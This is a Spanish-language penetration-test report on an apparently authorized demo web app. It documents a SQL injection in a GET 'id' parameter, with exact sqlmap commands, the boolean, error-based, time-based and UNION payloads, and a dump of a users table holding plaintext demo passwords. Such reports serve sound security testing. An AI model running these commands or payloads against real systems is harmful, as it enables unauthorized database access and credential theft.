# Informe de auditoría SQL Injection

## Resumen Ejecutivo

Se auditó el objetivo autorizado `http://web.dev.local:8083` mediante reconocimiento manual con `curl` y validación/explotación con `sqlmap --batch`.

Se identificó una vulnerabilidad de **SQL Injection** en el parámetro **GET `id`** cuando la aplicación recibe la petición del formulario con `Submit=Submit`. La vulnerabilidad fue confirmada por `sqlmap` usando varias técnicas (boolean-based blind, error-based, time-based blind y UNION).

La explotación fue **exitosa**: se extrajo el usuario actual de base de datos, la base actual, las bases disponibles y registros de la tabla `sqli_demo.users`, incluyendo nombres de usuario, correos y contraseñas en texto claro.

## Objetivo

- URL base: `http://web.dev.local:8083/`
- Aplicación observada: formulario HTML de búsqueda de usuarios
- Tecnología detectada: `Apache/2.4.65 (Debian)`, `PHP/8.1.33`

## Metodología

1. Reconocimiento con `curl` para identificar formularios y parámetros.
2. Verificación manual del comportamiento de respuestas variando `id`.
3. Escaneo de inyección SQL con `sqlmap --batch`.
4. Explotación controlada con extracción de metadatos y contenido de tablas.
5. Consolidación de evidencias.

## Vectores Analizados

### Vector 1

- Método: `GET`
- Endpoint: `/`
- Parámetros observados:
  - `id`
  - `Submit`
- Petición relevante:
  - `http://web.dev.local:8083/?id=1&Submit=Submit`

## Hallazgos

### Hallazgo 1: SQL Injection en `GET id`

**Severidad estimada:** Crítica

**Descripción:**
El parámetro `id` es inyectable en contexto SQL. La aplicación presenta diferencias de respuesta cuando se incluye `Submit=Submit`, y `sqlmap` confirmó múltiples técnicas de inyección sobre ese parámetro.

**Comando de validación principal:**

```bash
sqlmap --batch -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --level=5 --risk=3 --flush-session --random-agent
```

**Resultado clave de sqlmap:**

- `GET parameter 'id' is vulnerable`
- DBMS detectado: `MySQL >= 5.1 (MariaDB fork)`

**Payloads exactos reportados por sqlmap:**

```text
Boolean-based blind:
id=1' OR NOT 7855=7855-- CjOa&Submit=Submit

Error-based:
id=1' AND EXTRACTVALUE(4778,CONCAT(0x5c,0x717a6b7871,(SELECT (ELT(4778=4778,1))),0x7178787a71))-- svpg&Submit=Submit

Time-based blind:
id=1' AND (SELECT 9616 FROM (SELECT(SLEEP(5)))rGHA)-- OuDM&Submit=Submit

UNION query:
id=1' UNION ALL SELECT CONCAT(0x717a6b7871,0x52584c6d5a5a6d664f746e524b7078744c59634275446450697a787156727072524845756748594b,0x7178787a71),NULL-- -&Submit=Submit
```

## Evidencia de Reconocimiento

El HTML inicial mostró un único formulario:

- `method=GET`
- `action=#`
- campo `name="id"`

Además, las respuestas cambiaron al incluir el parámetro `Submit`:

```text
(root)                    200 2576 f8cfb7d81ebe3d70e5fd4b92aeaacb00
?id=1                     200 2576 f8cfb7d81ebe3d70e5fd4b92aeaacb00
?id=2                     200 2576 f8cfb7d81ebe3d70e5fd4b92aeaacb00
?id=1&Submit=Submit       200 2632 d4fa790b8959345407b99c6fd3fac27d
?id=2&Submit=Submit       200 2634 ff1950b5e2ed3c396d739430b8f89ba6
?id=1%27&Submit=Submit    200 476  e5c5af1a754c613bc36abd26f4447769
```

Esto indica que el vector explotable real es `/?id=...&Submit=Submit`.

## Evidencia de Explotación

### Enumeración de metadatos

**Comando:**

```bash
sqlmap --batch -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --current-user --current-db --dbs
```

**Resultados:**

```text
current user: 'root@%'
current database: 'sqli_demo'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo
[*] sys
```

### Enumeración de tablas y columnas

**Comandos:**

```bash
sqlmap --batch -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id -D sqli_demo --tables
sqlmap --batch -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id -D sqli_demo -T users --columns
```

**Resultados:**

```text
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+

Table: users
[6 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| email      | varchar(100) |
| first_name | varchar(50)  |
| last_name  | varchar(50)  |
| password   | varchar(255) |
| user_id    | int(11)      |
| username   | varchar(50)  |
+------------+--------------+
```

### Extracción de datos

**Comando:**

```bash
sqlmap --batch -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id -D sqli_demo -T users -C "email,password,user_id,username" --dump
```

**Datos extraídos:**

```text
Database: sqli_demo
Table: users
[8 entries]
+---------+-----------+---------------------+-------------+
| user_id | username  | email               | password    |
+---------+-----------+---------------------+-------------+
| 1       | admin     | admin@example.com   | password123 |
| 2       | jsmith    | jane@example.com    | secret456   |
| 3       | bjohnson  | bob@example.com     | mypass789   |
| 4       | awilliams | alice@example.com   | qwerty123   |
| 5       | cbrown    | charlie@example.com | password    |
| 6       | ddavis    | diana@example.com   | secure123   |
| 7       | emiller   | eve@example.com     | hackme      |
| 8       | fwilson   | frank@example.com   | admin123    |
+---------+-----------+---------------------+-------------+
```

La extracción de credenciales en texto claro demuestra impacto alto y explotación satisfactoria.

## Impacto

- Acceso no autorizado a información sensible.
- Enumeración completa de bases de datos y tablas.
- Extracción de credenciales de usuarios.
- Posible escalada hacia compromiso total de la aplicación y reutilización de credenciales.

## Conclusión

La aplicación es vulnerable a **SQL Injection** en el parámetro `id` del formulario de búsqueda, siempre que la petición incluya `Submit=Submit`. La vulnerabilidad fue validada con `sqlmap` y explotada con éxito, logrando enumerar la base de datos `sqli_demo` y extraer contenidos de la tabla `users`, incluyendo contraseñas en texto claro.

## Artefactos generados

- Reconocimiento: `/app/reports/recon_live/`
- Evidencias SQLi: `/app/reports/sqli_live/`
- Volcado de sqlmap: `/root/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv`
